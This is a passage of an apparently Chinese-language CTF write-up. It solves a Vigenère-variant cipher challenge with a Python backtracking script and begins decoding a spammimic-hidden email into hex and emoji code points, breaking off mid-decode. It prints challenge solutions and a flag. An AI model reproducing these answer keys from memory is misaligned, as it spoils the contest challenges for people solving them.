class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">K X </span><br><span class="line">W,Q,496</span><br><span class="line"></span><br><span class="line">O </span><br><span class="line">t,d,497</span><br><span class="line"></span><br><span class="line">J W</span><br><span class="line">e,o,498</span><br><span class="line"></span><br><span class="line">J</span><br><span class="line">r,y,499</span><br><span class="line"></span><br><span class="line">H U</span><br><span class="line">C,S,500</span><br><span class="line"></span><br><span class="line">O</span><br><span class="line">T,Z,501</span><br><span class="line"></span><br><span class="line">G T</span><br><span class="line">F,B,502</span><br></pre></td></tr></table></figure><p></p><p>然后，利用下面的代码，用部分密钥尝试还原出原文</p><p>因为只知道密钥的一部分，所以只能还原原文的一些片段。具体的操作为，考虑到密钥的长度在 10 和 20 之间，枚举密钥的长度，对于每个枚举，根据 <code>Q4doySZB</code> 在密文中的位置推算已知密钥片段在密钥中的位置</p><p>另外，考虑到密钥已知部分的每一位都可能有多种取值，还需要用回溯法枚举所有可能的密钥片段，可能性只有 16 种，数量不是很大</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">recv = <span class="string">&#x27;Vqcvh! Pd beoq, m bhkhbu bxohuowrlkux fljknkh, oufr bysgocsklze au vydo loydcy uab bybrxcr rr hne xcmsziopexqm bd Lqjk. Qbmi Owyaiy, xy tuxa Fyzyrp uv Lgkcxo, bg ot Xycdpwk kp nty Imd fevrfm, dhk Baeuxd, Cqtecbqx, nq zxu ukwi Lbhgl Xisml el pry Hyegyycoicxkws toy Poxlhgpom ibnr zxue lhgu Owrihcon. Oecafyd, nugy Lqrllskl Josknkdpet kp u ns-tmtu Lkuuxyhb, ytchnc Cybepcqx, nlj xqy Siauw hu Vchaepin pryey Ictqb gkx Zykirepn Foycoj fuzahyxt-ytd Pmsx otd Xiemoigbshs nuc Byerbhxbr Jockiec hdj Rylmwvmai Lolfejbct oh Pyvpjokx. Uycqqz jxop Pshmsd oh Pobieyeds, m Prgrut Bbmxyzs uf Xcxnpsgpsiz yzcxwuy: x Pehbohlg Q4doySZB&#123;lYzyNRN_Jx3_sXMo_lBU3T3RG_5NBvR3I_84Ig_GcFB_i3L934ts3&#125;, okq Pmltqoowm Fojjun pid Pvazehe. Qbi egze Vglnsjj oo Fyzarytsu; g Syrtxhza, jyvn hi g Rynupr, luj yt Sumd, ycx tjy Fkskk wxx Hyeyiyje lz wkvv yhcfv yuu jwi Puhqgiqjk qbi Lbuolchd kut zdo Pulgsuki. Bblmbr, hniu Psmooyoycey bd Buhhfuku Oskru gyca Lknliey, lcz myzecr ymg Bonowoz boac nty Ighhqtq Psyvs uf Xuvskqzeyh. Uh gfoi Lkfh, mj bg sy Xybi neuz rizie ru cukq ssk tbj yqo wkf sghv gq P.&#x27;</span></span><br><span class="line"><span class="comment"># recv = &#x27;Q4doySZB&#x27;</span></span><br><span class="line"><span class="comment"># from secret import original_text</span></span><br><span class="line"><span class="comment"># print(original_text)</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">496</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_vigenere_variant</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    key_index = <span class="number">0</span></span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    text_index = key_index</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> plaintext:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            <span class="keyword">if</span> key[key_index % key_length] == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;?&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                key_index += <span class="number">1</span></span><br><span class="line">                text_index += <span class="number">1</span> </span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            key_char = key[key_index % key_length].upper()</span><br><span class="line">            key_offset = <span class="built_in">ord</span>(key_char) - <span class="number">65</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> char.isupper():</span><br><span class="line">                base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                base = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (text_index + <span class="number">1</span>) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                out = []</span><br><span class="line">                <span class="keyword">for</span> ori <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">ord</span>(char) == (ori + text_index * key_offset) % <span class="number">26</span> + base:</span><br><span class="line">                        out.append(<span class="built_in">chr</span>(ori+base))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(out) == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;()&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">len</span>(out) == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(out[<span class="number">0</span>], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(out, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                out = []</span><br><span class="line">                <span class="keyword">for</span> ori <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">ord</span>(char) == (ori - text_index * key_offset) % <span class="number">26</span> + base:</span><br><span class="line">                        out.append(<span class="built_in">chr</span>(ori+base))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(out) == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;()&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">len</span>(out) == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(out[<span class="number">0</span>], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(out, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># ciphertext += encrypted_char</span></span><br><span class="line">            key_index += <span class="number">1</span></span><br><span class="line">            text_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(char, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">length = random.randint(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr = [[<span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;X&#x27;</span>],</span><br><span class="line">       [<span class="string">&#x27;O&#x27;</span>],</span><br><span class="line">       [<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;W&#x27;</span>],</span><br><span class="line">       [<span class="string">&#x27;J&#x27;</span>],</span><br><span class="line">       [<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;U&#x27;</span>],</span><br><span class="line">       [<span class="string">&#x27;O&#x27;</span>],</span><br><span class="line">       [<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;T&#x27;</span>]]</span><br><span class="line">random_key_arr = []</span><br><span class="line">random_key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_idx</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">global</span> random_key, random_key_arr</span><br><span class="line">    <span class="keyword">if</span> i == <span class="built_in">len</span>(arr):</span><br><span class="line">        <span class="built_in">print</span>(random_key)</span><br><span class="line">        decrypt_vigenere_variant(recv, random_key)</span><br><span class="line">        <span class="comment"># print(f&#x27;&#123;decrypted&#125;&#x27;)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n------------&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> arr[i]:</span><br><span class="line">        random_key_arr.append(x)</span><br><span class="line">        random_key = <span class="string">&#x27;&#x27;</span>.join(random_key_arr)</span><br><span class="line">        try_idx(i+<span class="number">1</span>)</span><br><span class="line">        random_key_arr.pop(<span class="built_in">len</span>(random_key_arr)-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># print(random_key)</span></span><br><span class="line"></span><br><span class="line">lkey = <span class="built_in">len</span>(arr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;len(key)=<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    mod = start % i</span><br><span class="line">    old_arr = arr.copy()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(mod):</span><br><span class="line">        arr.insert(<span class="number">0</span>,[<span class="string">&#x27;?&#x27;</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(arr) &lt; i:</span><br><span class="line">        arr.append([<span class="string">&#x27;?&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(arr) == i:</span><br><span class="line">        try_idx(<span class="number">0</span>)</span><br><span class="line">    arr=old_arr</span><br></pre></td></tr></table></figure><p></p><p>运行后的输出比较长，需要人工筛选出合理的，即在里面找到一篇文章，已完全解密的单词都是合法的单词</p><p>可以发现，密钥长度为 13 时，大多数已解密的单词都是合法的</p><p>密钥为 <code>??KOWJHOG????</code> 时解密效果最好，结果为：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??ilx! In vi??, ? ???ble vaud??????an veter??, ???? vicario???? ?? both vic??? ??? villain ?? ??? ?icissit???? ?? Fate. Thi? ?????e, no mere ?????? of Vanit?, ?? ?? ?estige o? ??? ??x populi, ??? ???ant, Vani????, ?? the once ????? ?oice of t?? ????similit??? ??? Venerat?? ???? they onc? ?????ied. Howe???, ???s Valoro?? ????tation o? ? ??-??ne Vexat???, ???nds Vivi????, ??d has Vow?? ?? ??nquish t???? ??nal and V??????t Vermin ??????rd-ing Vi?? ??? ?ouchsaf??? ??? Violent?? ????ous and V??????us Viola???? ?? Volitio?. ?????t this Vo???? ?? Verbosi??, ? ???led Vest??? ?? ?indicat??? ???rges: a Va?????? W4terCTF&#123;??????H_Th3_mASk_???3?3??_5TRlK3S_84Ck_????_?3?934nc3&#125;, yet Vi??????s Vector ??? ???tory. The ???? ??rdict is ??????nce; a Ven?????, ?eld as a V?????, ?ot in Vai?, ??? ??e Value a?? ????city of s??? ???ll one da? ?????cate the ??????nt and th? ?????ous. Veri??, ???? Vichyss???? ?? Verbiag? ????? most Ver????, ??t within ??? ???umes lie? ??? ??brant Vo??? ?? ?alidati??. ?? ??is Vein, i? ?? ?? ?ery good ????? ?o meet yo? ??? ??u may cal? ?? ?.</span><br></pre></td></tr></table></figure><p></p><p>可以大胆猜测，其中的 <code>Howe???, ???s</code> 原文是 However, this，重复上面的操作，尝试逆推出密钥的另一部分</p><p>以下可以复用上面的代码，可以推测更长的密钥片段：</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;X&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;O&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;W&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;J&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;U&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;O&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;T&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;W&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;P&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;G&#x27;</span>],</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p></p><p>然后用更长的密钥片段尝试解密原文，筛选出其中有效的如下</p><p>密钥为 <code>??KOWJHOGWPG?</code></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??ilx! In view, a ???ble vaudevi???an veteran, c??? vicariousl? ?? both victim ??? villain by t?? ?icissitude? ?? Fate. This Vi???e, no mere Ven??? of Vanity, is ?? ?estige of th? ??x populi, now ???ant, Vanishe?, ?? the once Vit?? ?oice of the V???similitude ??? Venerates w??? they once Vi???ied. However, ???s Valorous V???tation of a b?-??ne Vexation, ???nds Vivifie?, ??d has Vowed t? ??nquish thes? ??nal and Viru???t Vermin van???rd-ing Vice a?? ?ouchsafing ??? Violently V???ous and Vora???us Violatio? ?? Volition. Am???t this Vorte? ?? Verbosity, a ???led Vestige ?? ?indication ???rges: a Varia??? W4terCTF&#123;bEn???H_Th3_mASk_vIG3?3??_5TRlK3S_84Ck_WiT?_?3?934nc3&#125;, yet Vivac???s Vector for ???tory. The onl? ??rdict is Ven???nce; a Vendet??, ?eld as a Voti??, ?ot in Vain, fo? ??e Value and V???city of such ???ll one day Vi???cate the Vig???nt and the Vi???ous. Verily, t??? Vichyssois? ?? Verbiage Ve??? most Verbos?, ??t within its ???umes lies th? ??brant Voice ?? ?alidation. I? ??is Vein, it is ?? ?ery good hon?? ?o meet you an? ??u may call me ?.</span><br></pre></td></tr></table></figure><p></p><p>继续重复上面的操作 1-2 次，得到真正的密钥和原文</p><p>密钥 <code>BYKOWJHOGWPGG</code></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Voilx! In view, a humble vaudevillian veteran, cast vicariously as both victim and villain by the vicissitudes of Fate. This Visage, no mere Veneer of Vanity, is it Vestige of the Vox populi, now Vacant, Vanished, as the once Vital Voice of the Verisimilitude now Venerates what they once Vilified. However, this Valorous Visitation of a by-gone Vexation, stands Vivified, and has Vowed to Vanquish these Venal and Virulent Vermin vanguard-ing Vice and Vouchsafing the Violently Vicious and Voracious Violation of Volition. Amidst this Vortex of Verbosity, a Veiled Vestige of Vindication emerges: a Variable W4terCTF&#123;bEneATH_Th3_mASk_vIG3N3RE_5TRlK3S_84Ck_WiTH_v3N934nc3&#125;, yet Vivacious Vector for Victory. The only Verdict is Vengeance; a Vendetta, held as a Votive, not in Vain, for the Value and Veracity of such shall one day Vindicate the Vigilant and the Virtuous. Verily, this Vichyssoise of Verbiage Veers most Verbose, yet within its Volumes lies the Vibrant Voice of Validation. In this Vein, it is my Very good honor to meet you and you may call me V.</span><br></pre></td></tr></table></figure><p></p><p>拿到 flag</p><p><code>W4terCTF&#123;bEneATH_Th3_mASk_vIG3N3RE_5TRlK3S_84Ck_WiTH_v3N934nc3&#125;</code></p><h2 id="spam-2024"><a class="anchor" href="#spam-2024">#</a> Spam 2024</h2><p>下载得到一篇很长的垃圾邮件</p><p>参考资料：<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5ydHNlYy5jbi9kLzExNi1nb25nLWZhbmctc2hpLWppZS1jcnlwdG8tamktY2h1LXRpLW11LWNyeXB0b2xhLWppLXlvdS1qaWFu">https://forum.rtsec.cn/d/116-gong-fang-shi-jie-crypto-ji-chu-ti-mu-cryptola-ji-you-jian</span></p><p>使用 https://www.spammimic.com/，Decode 正文部分，得到</p><p></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">59</span>,<span class="number">6</span>f,<span class="number">75</span>,<span class="number">20</span>,<span class="number">6</span>c,<span class="number">69</span>,<span class="number">6</span>b,<span class="number">65</span>,<span class="number">20</span>,<span class="number">65</span>,<span class="number">6</span>d,<span class="number">6</span>f,<span class="number">6</span>a,<span class="number">69</span>,<span class="number">73</span>,<span class="number">2</span>c,<span class="number">20</span>,<span class="number">64</span>,<span class="number">6</span>f,<span class="number">6</span>e,<span class="number">27</span>,<span class="number">74</span>,<span class="number">20</span>,<span class="number">79</span>,<span class="number">6</span>f,<span class="number">75</span>,<span class="number">3</span>f,<span class="number">0</span>a,<span class="number">0</span>a,<span class="number">01</span>f643,<span class="number">01</span>f4b5,<span class="number">01</span>f33f,<span class="number">01</span>f3a4,<span class="number">01</span>f6aa,<span class="number">01</span>f30f,<span class="number">01</span>f40e,<span class="number">01</span>f94b,<span class="number">01</span>f6ab,<span class="number">01</span>f606,<span class="number">2705</span>,<span class="number">01</span>f606,<span class="number">01</span>f6b0,<span class="number">01</span>f4c2,<span class="number">01</span>f32a,<span class="number">263</span>a,<span class="number">01</span>f6e9,<span class="number">01</span>f30f,<span class="number">01</span>f4c2,<span class="number">01</span>f579,<span class="number">01</span>f993,<span class="number">01</span>f405,<span class="number">01</span>f375,<span class="number">01</span>f388,<span class="number">01</span>f600,<span class="number">01</span>f504,<span class="number">01</span>f6ab,<span class="number">01</span>f3a4,<span class="number">01</span>f993,<span class="number">2705</span>,<span class="number">01</span>f4ee,<span class="number">01</span>f3a4,<span class="number">01</span>f385,<span class="number">01</span>f34e,<span class="number">01</span>f643,<span class="number">01</span>f309,<span class="number">01</span>f383,<span class="number">01</span>f34d,<span class="number">01</span>f374,<span class="number">01</span>f463,<span class="number">01</span>f6b9,<span class="number">01</span>f923,<span class="number">01</span>f418,<span class="number">01</span>f3f9,<span class="number">263</span>a,<span class="number">01</span>f463,<span class="number">01</span>f4a7,<span class="number">01</span>f463,<span class="number">01</span>f993,<span class="number">01</span>f33f,<span class="number">2328</span>,<span class="number">01</span>f32a,<span class="number">01</span>f30f,<span class="number">01</span>f643,<span class="number">01</span>f375,<span class="number">2753</span>,<span class="number">2602</span>,<span class="number">01</span>f309,<span class="number">01</span>f606,<span class="number">01</span>f3f9,<span class="number">01</span>f375,<span class="number">01</span>f4a7,<span class="number">01</span>f385,<span class="number">01</span>f449,<span class="number">01</span>f30a,<span class="number">01</span>f6b9,<span class="number">01</span>f6aa,<span class="number">01</span>f374,<span class="number">01</span>f60e,<span class="number">01</span>f383,<span class="number">01</span>f32a,<span class="number">01</span>f643,<span class="number">01</span>f441,<span class="number">01</span>f94b,<span class="number">01</span>f451,<span class="number">01</span>f4a7,<span class="number">01</span>f418,<span class="number">01</span>f3a4,<span class="number">01</span>f94b,<span class="number">01</span>f418,<span class="number">01</span>f6e9,<span class="number">01</span>f923,<span class="number">01</span>f309,<span class="number">01</span>f6e9,<span class="number">23</span>e9,<span class="number">01</span>f60d,<span class="number">2753</span>,<span class="number">01</span>f418,<span class="number">01</span>f621,<span class="number">2600</span>,<span class="number">01</span>f60d,<span class="number">01</span>f643,<span class="number">01</span>f601,<span class="number">01</span>f600,<span class="number">01</span>f601,<span class="number">01</span>f6ab,<span class="number">01</span>f4c2,<span class="number">2705</span>,<span class="number">2603</span>,<span class="number">01</span>f6ab,<span class="number">01</span>f60e,<span class="number">01</span>f52a,<span class="number">01</span>f451,<span class="number">01</span>f600,<span class="number">01</span>f579,<span class="number">01</span>f6ab,<span class="number">01</span>f60d,<span class="number">01</span>f32a,<span class="number">01</span>f4c2,<span class="number">01</span>f44c,<span class="number">01</span>f34d,<span class="number">01</span>f44c,<span class="number">01</span>f993,<span class="number">01</span>f590,<span class="number">01</span>f923,<span class="number">01</span>f60e,<span class="number">01</span>f3ce,<span class="number">01</span>f34d,<span class="number">01</span>f3f9,<span class="number">01</span>f34c,<span class="number">01</span>f34d,<span class="number">01</span>f3a4,<span class="number">2600</span>,<span class="number">01</span>f3f9,<span class="number">01</span>f388,<span class="number">01</span>f6b0,<span class="number">01</span>f4a7,<span class="number">2600</span>,<span class="number">2709</span>,<span class="number">01</span>f3f9,<span class="number">01</span>f34d,<span class="number">01</span>f993,<span class="number">01</span>f385,<span class="number">01</span>f374,<span class="number">2602</span>,<span class="number">23</span>e9,<span class="number">01</span>f6aa,<span class="number">01</span>f40d,<span class="number">263</span>a,<span class="number">01</span>f418,<span class="number">01</span>f607,<span class="number">01</span>f621,<span class="number">01</span>f375,<span class="number">01</span>f30f,<span class="number">01</span>f993,<span class="number">01</span>f375,<span class="number">01</span>f6e9,<span class="number">01</span>f4c2,<span class="number">01</span>f44c,<span class="number">01</span>f3f9,<span class="number">01</span>f5d2,<span class="number">01</span>f5d2,<span class="number">0</span>a,<span class="number">0</span>a,<span class="number">42</span>,<span class="number">74</span>,<span class="number">77</span>,<span class="number">2</span>c,<span class="number">20</span>,<span class="number">74</span>,<span class="number">68</span>,<span class="number">65</span>,<span class="number">20</span>,<span class="number">6</span>b,<span class="number">65</span>,<span class="number">79</span>,<span class="number">20</span>,<span class="number">69</span>,<span class="number">73</span>,<span class="number">20</span>,<span class="number">22</span>,<span class="number">4</span>b,<span class="number">45</span>,<span class="number">59</span>,<span class="number">22</span></span><br></pre></td></tr></table></figure><p></p><p>From HEX</p><p></p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You <span class="built_in">like</span> emojis, don<span class="comment">&#x27;t you?</span></span><br><span class="line">(乱码)</span><br><span class="line">Btw, the <span class="keyword">key</span> <span class="built_in">is</span> <span class="string">&quot;KEY&quot;</span></span><br></pre></td></tr></table></figure><p></p><p>逗号换成 \u</p><p></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u59\u6f\u75\u20\u6c\u69\u6b\u65\u20\u65\u6d\u6f\u6a\u69\u73\u2c\u20\u64\u6f\u6e\u27\u74\u20\u79\u6f\u75\u3f\u0a\u0a<span class="symbol">\u01f6</span>43<span class="symbol">\u01f4</span>b5<span class="symbol">\u01f3</span>3f<span class="symbol">\u01f3</span>a4<span class="symbol">\u01f6</span>aa<span class="symbol">\u01f3</span>0f<span class="symbol">\u01f4</span>0e<span class="symbol">\u01f9</span>4b<span class="symbol">\u01f6</span>ab<span class="symbol">\u01f6</span>06<span class="symbol">\u2705</span><span class="symbol">\u01f6</span>06<span class="symbol">\u01f6</span>b0<span class="symbol">\u01f4</span>c2<span class="symbol">\u01f3</span>2a<span class="symbol">\u263a</span><span class="symbol">\u01f6</span>e9<span class="symbol">\u01f3</span>0f<span class="symbol">\u01f4</span>c2<span class="symbol">\u01f5</span>79<span class="symbol">\u01f9</span>93<span class="symbol">\u01f4</span>05<span class="symbol">\u01f3</span>75<span class="symbol">\u01f3</span>88<span class="symbol">\u01f6</span>00<span class="symbol">\u01f5</span>04<span class="symbol">\u01f6</span>ab<span class="symbol">\u01f3</span>a4<span class="symbol">\u01f9</span>93<span class="symbol">\u2705</span><span class="symbol">\u01f4</span>ee<span class="symbol">\u01f3</span>a4<span class="symbol">\u01f3</span>85<span class="symbol">\u01f3</span>4e<span class="symbol">\u01f6</span>43<span class="symbol">\u01f3</span>09<span class="symbol">\u01f3</span>83<span class="symbol">\u01f3</span>4d<span class="symbol">\u01f3</span>74<span class="symbol">\u01f4</span>63<span class="symbol">\u01f6</span>b9<span class="symbol">\u01f9</span>23<span class="symbol">\u01f4</span>18<span class="symbol">\u01f3</span>f9<span class="symbol">\u263a</span><span class="symbol">\u01f4</span>63<span class="symbol">\u01f4</span>a7<span class="symbol">\u01f4</span>63<span class="symbol">\u01f9</span>93<span class="symbol">\u01f3</span>3f<span class="symbol">\u2328</span><span class="symbol">\u01f3</span>2a<span class="symbol">\u01f3</span>0f<span class="symbol">\u01f6</span>43<span class="symbol">\u01f3</span>75<span class="symbol">\u2753</span><span class="symbol">\u2602</span><span class="symbol">\u01f3</span>09<span class="symbol">\u01f6</span>06<span class="symbol">\u01f3</span>f9<span class="symbol">\u01f3</span>75<span class="symbol">\u01f4</span>a7<span class="symbol">\u01f3</span>85<span class="symbol">\u01f4</span>49<span class="symbol">\u01f3</span>0a<span class="symbol">\u01f6</span>b9<span class="symbol">\u01f6</span>aa<span class="symbol">\u01f3</span>74<span class="symbol">\u01f6</span>0e<span class="symbol">\u01f3</span>83<span class="symbol">\u01f3</span>2a<span class="symbol">\u01f6</span>43<span class="symbol">\u01f4</span>41<span class="symbol">\u01f9</span>4b<span class="symbol">\u01f4</span>51<span class="symbol">\u01f4</span>a7<span class="symbol">\u01f4</span>18<span class="symbol">\u01f3</span>a4<span class="symbol">\u01f9</span>4b<span class="symbol">\u01f4</span>18<span class="symbol">\u01f6</span>e9<span class="symbol">\u01f9</span>23<span class="symbol">\u01f3</span>09<span class="symbol">\u01f6</span>e9<span class="symbol">\u23e9</span><span class="symbol">\u01f6</span>0d<span class="symbol">\u2753</span><span class="symbol">\u01f4</span>18<span class="symbol">\u01f6</span>21<span class="symbol">\u2600</span><span class="symbol">\u01f6</span>0d<span class="symbol">\u01f6</span>43<span class="symbol">\u01f6</span>01<span class="symbol">\u01f6</span>00<span class="symbol">\u01f6</span>01<span class="symbol">\u01f6</span>ab<span class="symbol">\u01f4</span>c2<span class="symbol">\u2705</span><span class="symbol">\u2603</span><span class="symbol">\u01f6</span>ab<span class="symbol">\u01f6</span>0e<span class="symbol">\u01f5</span>2a<span class="symbol">\u01f4</span>51<span class="symbol">\u01f6</span>00<span class="symbol">\u01f5</span>79<span class="symbol">\u01f6</span>ab<span class="symbol">\u01f6</span>0d<span class="symbol">\u01f3</span>2a<span class="symbol">\u01f4</span>c2<span class="symbol">\u01f4</span>4c<span class="symbol">\u01f3</span>4d<span class="symbol">\u01f4</span>4c<span class="symbol">\u01f9</span>93<span class="symbol">\u01f5</span>90<span class="symbol">\u01f9</span>23<span class="symbol">\u01f6</span>0e<span class="symbol">\u01f3</span>ce<span class="symbol">\u01f3</span>4d<span class="symbol">\u01f3</span>f9<span class="symbol">\u01f3</span>4c<span class="symbol">\u01f3</span>4d<span class="symbol">\u01f3</span>a4<span class="symbol">\u2600</span><span class="symbol">\u01f3</span>f9<span class="symbol">\u01f3</span>88<span class="symbol">\u01f6</span>b0<span class="symbol">\u01f4</span>a7<span class="symbol">\u2600</span><span class="symbol">\u2709</span><span class="symbol">\u01f3</span>f9<span class="symbol">\u01f3</span>4d<span class="symbol">\u01f9</span>93<span class="symbol">\u01f3</span>85<span class="symbol">\u01f3</span>74<span class="symbol">\u2602</span><span class="symbol">\u23e9</span><span class="symbol">\u01f6</span>aa<span class="symbol">\u01f4</span>0d<span class="symbol">\u263a</span><span class="symbol">\u01f4</span>18<span class="symbol">\u01f6</span>07<span 